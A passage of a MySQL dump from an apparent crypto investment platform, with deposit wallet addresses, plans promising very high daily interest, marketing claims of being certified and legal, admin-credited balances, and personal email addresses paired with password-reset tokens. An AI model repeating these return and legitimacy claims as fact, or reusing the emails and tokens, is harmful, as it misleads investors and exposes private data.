(519, NULL, 'BITCOIN', '50', '500000', '0', '0', '1', 'WALLET ADDRESS. bc1qavq7t8up5znudhvzyegmsvsdjz775n0j9anlxp', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2026-05-21 20:09:25', '2026-05-26 17:19:07'),
(520, NULL, 'ETHEREUM', '50', '50000', '0', '0', '1', 'WALLET ADDRESS 0x7F9677FCAceC42542B050Bac71860102ba8D4936', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2026-05-21 20:10:35', '2026-05-26 17:01:15'),
(521, NULL, 'USDT', '50', '50000', '0', '0', '1', 'WALLET ADDRESS. TSX2o3BQux8zLbMQVimbzJdunmzJgsJrPz', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2026-05-21 20:11:17', '2026-05-26 17:03:33'),
(522, NULL, 'BNB', '50', '50000', '0', '0', '1', 'WALLET ADDRESS0x7F9677FCAceC42542B050Bac71860102ba8D4936', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2026-05-21 20:11:56', '2026-05-26 17:04:17'),
(523, NULL, 'Litecoin', '50', '50000', '0', '0', '1', 'WALLET ADDRESS. ltc1qdr2axxpu2hed5wdca4g5xgw0n0q0v2puxwy76n', NULL, NULL, NULL, NULL, NULL, NULL, 1, '2026-05-21 20:13:37', '2026-05-26 17:05:00');

-- --------------------------------------------------------

--
-- Table structure for table `how_it_works`
--

CREATE TABLE `how_it_works` (
  `id` int(10) UNSIGNED NOT NULL,
  `icon` varchar(191) NOT NULL,
  `title` varchar(191) NOT NULL,
  `detail` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `how_it_works`
--

INSERT INTO `how_it_works` (`id`, `icon`, `title`, `detail`, `created_at`, `updated_at`) VALUES
(1, 'credit-card', 'Get Deposit', 'We use a very easy to use deposit method that let\'s you deposit your money without any hassle.', '2019-01-29 07:05:11', '2021-01-25 15:14:28'),
(3, 'university', 'Utilize Money', 'We have a group of skilled and professionals traders working all the time utilizing your money in the cryptocurrency market.', '2019-01-29 07:06:03', '2021-01-25 15:15:14'),
(4, 'money', 'Give Interest', 'We utilize your money and offer you the highest interest value providing a high income source.', '2019-01-29 07:06:15', '2021-01-25 15:18:08');

-- --------------------------------------------------------

--
-- Table structure for table `invests`
--

CREATE TABLE `invests` (
  `id` int(10) UNSIGNED NOT NULL,
  `user_id` int(11) NOT NULL,
  `plan_id` int(11) NOT NULL,
  `amount` varchar(191) NOT NULL,
  `interest` varchar(191) NOT NULL,
  `period` int(11) NOT NULL,
  `hours` varchar(20) NOT NULL,
  `time_name` varchar(190) NOT NULL,
  `return_rec_time` int(11) NOT NULL DEFAULT 0,
  `next_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `last_time` timestamp NULL DEFAULT NULL,
  `status` tinyint(1) NOT NULL,
  `capital_status` tinyint(1) NOT NULL COMMENT '1 = YES & 0 = NO',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `invests`
--

INSERT INTO `invests` (`id`, `user_id`, `plan_id`, `amount`, `interest`, `period`, `hours`, `time_name`, `return_rec_time`, `next_time`, `last_time`, `status`, `capital_status`, `created_at`, `updated_at`) VALUES
(1, 4, 3, '5000', '375', 10, '24', 'Days', 10, '2026-06-02 22:50:03', '2026-06-01 22:50:03', 0, 1, '2026-05-11 18:59:47', '2026-06-01 22:50:03'),
(2, 5, 3, '9000', '675', 10, '24', 'Days', 10, '2026-06-04 22:50:04', '2026-06-03 22:50:04', 0, 1, '2026-05-14 00:38:03', '2026-06-03 22:50:04'),
(3, 2, 1, '200', '9', 1, '24', 'Days', 1, '2026-05-26 22:49:30', '2026-05-25 22:49:30', 0, 1, '2026-05-20 00:53:47', '2026-05-25 22:49:30'),
(4, 4, 2, '2000', '100', 5, '24', 'Days', 5, '2026-05-30 22:50:03', '2026-05-29 22:50:03', 0, 1, '2026-05-20 12:10:01', '2026-05-29 22:50:03'),
(5, 7, 2, '500', '25', 5, '24', 'Days', 5, '2026-05-30 22:50:03', '2026-05-29 22:50:03', 0, 1, '2026-05-22 17:36:25', '2026-05-29 22:50:03'),
(6, 5, 2, '500', '25', 5, '24', 'Days', 5, '2026-05-30 22:50:03', '2026-05-29 22:50:03', 0, 1, '2026-05-23 00:41:33', '2026-05-29 22:50:03'),
(7, 2, 2, '500', '25', 5, '24', 'Days', 5, '2026-06-01 13:20:03', '2026-05-31 13:20:03', 0, 1, '2026-05-26 13:07:15', '2026-05-31 13:20:03'),
(8, 5, 2, '500', '25', 5, '24', 'Days', 5, '2026-06-05 02:50:04', '2026-06-04 02:50:04', 0, 1, '2026-05-30 02:45:26', '2026-06-04 02:50:04'),
(9, 5, 2, '500', '25', 5, '24', 'Days', 5, '2026-06-10 00:20:05', '2026-06-09 00:20:05', 0, 1, '2026-06-04 00:18:42', '2026-06-09 00:20:05'),
(10, 5, 2, '500', '25', 5, '24', 'Days', 5, '2026-06-15 18:30:11', '2026-06-14 18:30:11', 0, 1, '2026-06-09 18:20:55', '2026-06-14 18:30:11'),
(11, 5, 2, '500', '25', 5, '24', 'Days', 0, '2026-06-19 14:01:35', NULL, 1, 1, '2026-06-18 14:01:35', '2026-06-18 14:01:35'),
(12, 5, 2, '544', '27.2', 5, '24', 'Days', 0, '2026-07-04 21:20:47', NULL, 1, 1, '2026-07-03 21:20:47', '2026-07-03 21:20:47');

-- --------------------------------------------------------

--
-- Table structure for table `jobs`
--

CREATE TABLE `jobs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `queue` varchar(191) NOT NULL,
  `payload` longtext NOT NULL,
  `attempts` tinyint(3) UNSIGNED NOT NULL,
  `reserved_at` int(10) UNSIGNED DEFAULT NULL,
  `available_at` int(10) UNSIGNED NOT NULL,
  `created_at` int(10) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `languages`
--

CREATE TABLE `languages` (
  `id` int(10) UNSIGNED NOT NULL,
  `icon` varchar(191) DEFAULT NULL,
  `name` varchar(191) NOT NULL,
  `code` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `menus`
--

CREATE TABLE `menus` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `title` text NOT NULL,
  `text` longtext NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(191) NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(6, '2018_09_15_055044_create_admins_table', 1),
(14, '2018_09_23_070452_create_accounts_table', 8),
(15, '2018_10_06_111835_create_teams_table', 9),
(16, '2018_10_06_111923_create_testimonials_table', 9),
(17, '2018_10_06_131253_create_socials_table', 10),
(18, '2018_10_09_124655_create_services_table', 11),
(19, '2018_10_11_054818_create_blogs_table', 12),
(20, '2014_10_12_000000_create_users_table', 13),
(21, '2018_10_11_112743_create_menus_table', 14),
(22, '2018_10_13_120207_create_links_table', 15),
(23, '2018_10_14_124147_create_advertises_table', 16),
(24, '2018_10_15_094201_create_transections_table', 17),
(25, '2018_10_15_112248_create_withdraws_table', 18),
(26, '2018_10_15_112459_create_withdraw_methods_table', 18),
(27, '2018_10_20_101804_create_support_tickets_table', 19),
(28, '2018_10_20_101909_create_ticket_comments_table', 19),
(29, '2018_10_21_073244_create_ip_tracks_table', 20),
(30, '2018_12_04_055504_create_faqs_table', 21),
(31, '2018_12_05_094029_create_plans_table', 22),
(32, '2018_12_05_122043_create_time_settings_table', 23),
(33, '2018_12_11_055235_create_invests_table', 24),
(34, '2018_12_19_102753_create_epins_table', 25),
(35, '2018_12_19_133151_create_referrals_table', 26),
(36, '2018_12_27_122808_create_subscribers_table', 27),
(37, '2018_12_27_141219_create_jobs_table', 28),
(38, '2019_01_05_114834_create_languages_table', 29),
(39, '2019_01_29_124624_create_how_it_works_table', 30);

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(191) NOT NULL,
  `token` varchar(191) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `password_resets`
--

INSERT INTO `password_resets` (`email`, `token`, `status`, `created_at`) VALUES
('user@site.com', 'XNk2vWYYTHdUTRg1myNqny9RlEbla6', 1, '2021-01-14 05:16:05'),
('user@site.com', 'p6d5Dpr2y9om341OZP3n4a5QF77kf4', 1, '2021-01-16 03:44:15'),
('user@site.com', 'SlJINslYzZ1VEUYoVkK0caKH2jB0Hu', 1, '2021-01-16 03:44:48'),
('user@site.com', 'YiZg36S4R2NTm6KmlQMDwsnaa3id5V', 1, '2021-01-16 03:45:16'),
('user@site.com', 'fqnRtNH6JxtQfTYdKWT9KD2DMJr8UU', 1, '2021-01-16 03:45:47'),
('user@site.com', 'yIlnWmifAdjrewCiav15fbZNpVRAnV', 1, '2021-01-16 23:24:06'),
('donldhydevid@gmail.com', 'Mq2yXKMp23J0nNaMv4fNdnqWNlAVqm', 0, '2026-05-11 06:46:08'),
('shipwreckcoast1@gmail.com', 'a3V4USMx2vag8R42ZH1n5En37V19Gx', 0, '2026-07-02 03:17:47'),
('shipwreckcoast1@gmail.com', 'lm7oAE1kiREmkeVX4hmp4ck81usWnG', 0, '2026-07-02 03:18:17'),
('shipwreckcoast1@gmail.com', 'dmRUdZsEQDkr3w6lUUtLkClJwYOkD3', 0, '2026-07-02 03:21:35');

-- --------------------------------------------------------

--
-- Table structure for table `plans`
--

CREATE TABLE `plans` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `minimum` varchar(191) NOT NULL,
  `maximum` varchar(191) NOT NULL,
  `fixed_amount` varchar(190) NOT NULL,
  `interest` varchar(191) NOT NULL,
  `interest_status` int(11) NOT NULL COMMENT '1 = ''%'' / 0 =''currency''',
  `times` varchar(191) NOT NULL,
  `status` int(11) NOT NULL,
  `capital_back_status` int(11) NOT NULL,
  `lifetime_status` int(11) NOT NULL,
  `repeat_time` varchar(190) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `plans`
--

INSERT INTO `plans` (`id`, `name`, `minimum`, `maximum`, `fixed_amount`, `interest`, `interest_status`, `times`, `status`, `capital_back_status`, `lifetime_status`, `repeat_time`, `created_at`, `updated_at`) VALUES
(1, 'Starter', '200', '499', '0', '4.5', 1, '24', 1, 0, 1, '0', '2026-05-07 16:20:52', '2026-05-23 16:00:27'),
(2, 'Professional', '500', '4999', '0', '5.0', 1, '24', 1, 1, 0, '5', '2026-05-07 16:21:32', '2026-05-07 16:23:15'),
(3, 'Enterprise', '5000', '9999', '0', '7.5', 1, '24', 1, 1, 0, '10', '2026-05-07 16:24:05', '2026-05-07 16:24:05'),
(4, 'Module 1', '10000', '49999', '0', '10.0', 1, '24', 1, 1, 0, '30', '2026-05-23 15:58:20', '2026-05-26 12:01:29'),
(5, 'Module 2', '50000', '100000', '0', '12.0', 1, '24', 1, 1, 0, '30', '2026-05-26 11:49:20', '2026-05-26 11:58:16'),
(6, 'Property package', '100000', '500000', '0', '40.0', 1, '24', 1, 1, 0, '90', '2026-05-26 11:58:57', '2026-05-26 12:01:09');

-- --------------------------------------------------------

--
-- Table structure for table `referrals`
--

CREATE TABLE `referrals` (
  `id` int(10) UNSIGNED NOT NULL,
  `level` int(11) NOT NULL,
  `percent` varchar(191) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `services`
--

CREATE TABLE `services` (
  `id` int(10) UNSIGNED NOT NULL,
  `icon` varchar(191) NOT NULL,
  `title` varchar(191) NOT NULL,
  `detail` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `services`
--

INSERT INTO `services` (`id`, `icon`, `title`, `detail`, `created_at`, `updated_at`) VALUES
(2, 'copy', 'Certified', 'We are a certified company which conducts absolutely legal activities. We are certified and safe.', '2018-10-09 07:23:03', '2021-01-25 13:26:52'),
(3, 'lock', 'Secure', 'We constantly work on improving our system and level of our security to minimize any potential risks.', '2018-10-09 07:26:14', '2021-01-25 13:13:14'),
(4, 'bars', 'Profitable', 'We will utilize your money which will be performed by qualified professional traders and provide a high income.', '2018-10-09 07:29:50', '2021-01-25 13:17:45'),
(5, 'bitcoin', 'Crypto', 'Our platform supports all types of cryptocurrency so investing here is easier.', '2018-12-03 23:27:34', '2021-01-25 13:20:16'),
(6, 'life-ring', 'Support', 'We provide 24/7 customer customer support. We are here to offer you the best support.', '2019-01-22 21:47:35', '2021-01-25 13:27:12'),
(7, 'globe', 'Global', 'We are an international company working globally having clients from different parts of the world.', '2019-01-22 21:48:21', '2021-01-25 13:27:18');

-- --------------------------------------------------------

--
-- Table structure for table `socials`
--

CREATE TABLE `socials` (
  `id` int(10) UNSIGNED NOT NULL,
  `icon` varchar(191) NOT NULL,
  `link` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `subscribers`
--

CREATE TABLE `subscribers` (
  `id` int(10) UNSIGNED NOT NULL,
  `email` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `support_tickets`
--

CREATE TABLE `support_tickets` (
  `id` int(10) UNSIGNED NOT NULL,
  `ticket` varchar(191) NOT NULL,
  `subject` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `teams`
--

CREATE TABLE `teams` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `designation` varchar(191) NOT NULL,
  `image` varchar(191) NOT NULL,
  `fb_link` text NOT NULL,
  `ln_link` text NOT NULL,
  `tw_link` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `testimonials`
--

CREATE TABLE `testimonials` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `company` varchar(191) NOT NULL,
  `comment` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `ticket_comments`
--

CREATE TABLE `ticket_comments` (
  `id` int(10) UNSIGNED NOT NULL,
  `ticket_id` varchar(111) NOT NULL,
  `type` int(11) NOT NULL,
  `comment` mediumtext NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `time_settings`
--

CREATE TABLE `time_settings` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) NOT NULL,
  `time` varchar(191) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `time_settings`
--

INSERT INTO `time_settings` (`id`, `name`, `time`, `created_at`, `updated_at`) VALUES
(1, 'Days', '24', '2026-05-07 16:20:32', '2026-05-07 16:22:38');

-- --------------------------------------------------------

--
-- Table structure for table `transections`
--

CREATE TABLE `transections` (
  `id` int(10) UNSIGNED NOT NULL,
  `trxid` varchar(190) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `amount` varchar(191) NOT NULL,
  `balance` varchar(191) NOT NULL,
  `des` varchar(191) NOT NULL,
  `charge` varchar(190) NOT NULL DEFAULT '0',
  `type` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `transections`
--

INSERT INTO `transections` (`id`, `trxid`, `user_id`, `amount`, `balance`, `des`, `charge`, `type`, `created_at`, `updated_at`) VALUES
(1, NULL, 4, '10000', '10000', 'Balance Added Via Admin', '0', 0, '2026-05-11 18:42:58', '2026-05-11 18:42:58'),
(2, 'TRX-1246', 4, '-5000', '5000', 'Invested On Enterprise', '0', 0, '2026-05-11 18:59:47', '2026-05-11 18:59:47'),
(3, 'TRX-64496a034075da94f', 4, '375', '5375', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-12 19:00:05', '2026-05-12 19:00:05'),
(4, 'TRX-51826a0491f58703b', 4, '375', '5750', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-13 19:00:05', '2026-05-13 19:00:05'),
(5, NULL, 5, '24000', '24000', 'Balance Added Via Admin', '0', 0, '2026-05-14 00:09:00', '2026-05-14 00:09:00'),
(6, 'TRX-2087', 5, '-9000', '15000', 'Invested On Enterprise', '0', 0, '2026-05-14 00:38:03', '2026-05-14 00:38:03'),
(7, 'hTqUw5gMbVtsGrnL', 2, '200', '200', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-20 00:36:04', '2026-05-20 00:36:04'),
(8, 'TRX-2093', 2, '-200', '0', 'Invested On Starter', '0', 0, '2026-05-20 00:53:47', '2026-05-20 00:53:47'),
(9, 'TRX-5253', 4, '-2000', '3750', 'Invested On Professional', '0', 0, '2026-05-20 12:10:01', '2026-05-20 12:10:01'),
(10, 'sL7hKWNbnd5KzgW8', 2, '200', '200', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-21 21:00:57', '2026-05-21 21:00:57'),
(11, 'RsHD1zwG53qnpNIt', 7, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-22 16:26:32', '2026-05-22 16:26:32'),
(12, 'TRX-3512', 7, '-500', '0', 'Invested On Professional', '0', 0, '2026-05-22 17:36:25', '2026-05-22 17:36:25'),
(13, 'ct4shy4DwLsmuvRf', 5, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-23 00:36:22', '2026-05-23 00:36:22'),
(14, 'TRX-1889', 5, '-500', '0', 'Invested On Professional', '0', 0, '2026-05-23 00:41:33', '2026-05-23 00:41:33'),
(15, NULL, 5, '-500', '14500', 'Balance Subtract Via Admin', '0', 0, '2026-05-23 00:47:59', '2026-05-23 00:47:59'),
(16, NULL, 5, '1000', '15500', 'Balance Added Via Admin', '0', 0, '2026-05-23 00:48:30', '2026-05-23 00:48:30'),
(17, NULL, 5, '-500', '15000', 'Balance Subtract Via Admin', '0', 0, '2026-05-23 00:49:26', '2026-05-23 00:49:26'),
(18, NULL, 5, '1500', '16500', 'Balance Added Via Admin', '0', 0, '2026-05-23 00:50:02', '2026-05-23 00:50:02'),
(19, 'dzwuoCjJ2NQLbUl4', 2, '200', '400', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-23 10:43:52', '2026-05-23 10:43:52'),
(20, 'SKs06P5Av2CGrBIt', 4, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-23 15:38:35', '2026-05-23 15:38:35'),
(21, NULL, 4, '125', '3875', 'Balance Added Via Admin', '0', 0, '2026-05-24 19:26:52', '2026-05-24 19:26:52'),
(22, NULL, 5, '25', '16525', 'Balance Added Via Admin', '0', 0, '2026-05-24 19:29:14', '2026-05-24 19:29:14'),
(23, NULL, 5, '375', '16900', 'Balance Added Via Admin', '0', 0, '2026-05-24 19:29:50', '2026-05-24 19:29:50'),
(24, 'TRX-12456a14d1fa0b818', 4, '375', '4250', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(25, 'TRX-96186a14d1fa0c315', 5, '675', '17575', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(26, 'TRX-75266a14d1fa0cd63', 2, '9', '209', 'Interest Return 9 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(27, 'TRX-54946a14d1fa0d7b4', 4, '100', '4350', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(28, 'TRX-80476a14d1fa0e1c0', 7, '25', '25', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(29, 'TRX-95096a14d1fa0ec0b', 5, '25', '17600', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-25 22:49:30', '2026-05-25 22:49:30'),
(30, '79wfhSe8CXy9ZGS8', 2, '100', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-26 13:04:52', '2026-05-26 13:04:52'),
(31, 'TRX-5493', 2, '-500', '0', 'Invested On Professional', '0', 0, '2026-05-26 13:07:15', '2026-05-26 13:07:15'),
(32, 'TRX-20126a16239b9d118', 4, '375', '4725', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-26 22:50:03', '2026-05-26 22:50:03'),
(33, 'TRX-85096a16239b9fd1f', 5, '675', '18275', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-26 22:50:03', '2026-05-26 22:50:03'),
(34, 'TRX-66826a16239ba0652', 4, '100', '4825', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-26 22:50:03', '2026-05-26 22:50:03'),
(35, 'TRX-74906a16239ba0ed2', 7, '25', '50', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-26 22:50:03', '2026-05-26 22:50:03'),
(36, 'TRX-84166a16239ba1727', 5, '25', '18300', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-26 22:50:03', '2026-05-26 22:50:03'),
(37, 'TRX-72326a16ed2c48bde', 2, '25', '234', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 13:10:04', '2026-05-27 13:10:04'),
(38, 'TRX-93436a17751b69e89', 4, '375', '5200', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 22:50:03', '2026-05-27 22:50:03'),
(39, 'TRX-10356a17751b6a8c1', 5, '675', '18975', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 22:50:03', '2026-05-27 22:50:03'),
(40, 'TRX-71626a17751b6b21d', 4, '100', '5300', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 22:50:03', '2026-05-27 22:50:03'),
(41, 'TRX-53376a17751b6bb02', 7, '25', '75', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 22:50:03', '2026-05-27 22:50:03'),
(42, 'TRX-97966a17751b6c4a7', 5, '25', '19000', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-27 22:50:03', '2026-05-27 22:50:03'),
(43, 'TRX-39166a183fd81b4f0', 2, '25', '259', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 13:15:04', '2026-05-28 13:15:04'),
(44, 'TRX-15466a18c69bbb7a7', 4, '375', '5675', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 22:50:03', '2026-05-28 22:50:03'),
(45, 'TRX-68126a18c69bbc364', 5, '675', '19675', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 22:50:03', '2026-05-28 22:50:03'),
(46, 'TRX-31546a18c69bbcd9f', 4, '100', '5775', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 22:50:03', '2026-05-28 22:50:03'),
(47, 'TRX-59226a18c69bbd756', 7, '25', '100', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 22:50:03', '2026-05-28 22:50:03'),
(48, 'TRX-37696a18c69bbe1e9', 5, '25', '19700', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-28 22:50:03', '2026-05-28 22:50:03'),
(49, 'TRX-39536a199283a4adf', 2, '25', '284', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 13:20:03', '2026-05-29 13:20:03'),
(50, 'TRX-73816a1a181be776c', 4, '375', '6150', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 22:50:03', '2026-05-29 22:50:03'),
(51, 'TRX-36716a1a181be825b', 5, '675', '20375', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 22:50:03', '2026-05-29 22:50:03'),
(52, 'TRX-58526a1a181be8b96', 4, '100', '8250', 'Interest Return 100 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 22:50:03', '2026-05-29 22:50:03'),
(53, 'TRX-67996a1a181be945c', 7, '25', '625', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 22:50:03', '2026-05-29 22:50:03'),
(54, 'TRX-76886a1a181be9d8f', 5, '25', '20900', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-29 22:50:03', '2026-05-29 22:50:03'),
(55, 'BU6YNbTl6Op5iXBc', 5, '500', '500', 'Deposit Request Approved & Balance Added', '0', 0, '2026-05-30 01:44:43', '2026-05-30 01:44:43'),
(56, 'TRX-4862', 5, '-500', '0', 'Invested On Professional', '0', 0, '2026-05-30 02:45:26', '2026-05-30 02:45:26'),
(57, 'TRX-13596a1ae403864fc', 2, '25', '309', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-30 13:20:03', '2026-05-30 13:20:03'),
(58, 'TRX-84066a1b699b27864', 4, '375', '8625', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-30 22:50:03', '2026-05-30 22:50:03'),
(59, 'TRX-19786a1b699b28990', 5, '675', '21575', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-30 22:50:03', '2026-05-30 22:50:03'),
(60, 'TRX-60306a1ba1db6adb0', 5, '25', '21600', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-31 02:50:03', '2026-05-31 02:50:03'),
(61, 'TRX-15466a1c35833709b', 2, '25', '834', 'Interest Return 25 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-31 13:20:03', '2026-05-31 13:20:03'),
(62, 'TRX-39006a1cbb1b47c79', 4, '375', '9000', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-31 22:50:03', '2026-05-31 22:50:03'),
(63, 'TRX-75456a1cbb1b4884e', 5, '675', '22275', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-05-31 22:50:03', '2026-05-31 22:50:03'),
(64, 'TRX-18226a1cf35bb3218', 5, '25', '22300', 'Interest & Capital Return 0 USD Added on Your Interest Wallet Wallet', '0', 0, '2026-06-01 02:50:03', '2026-06-01 02:50:03'),
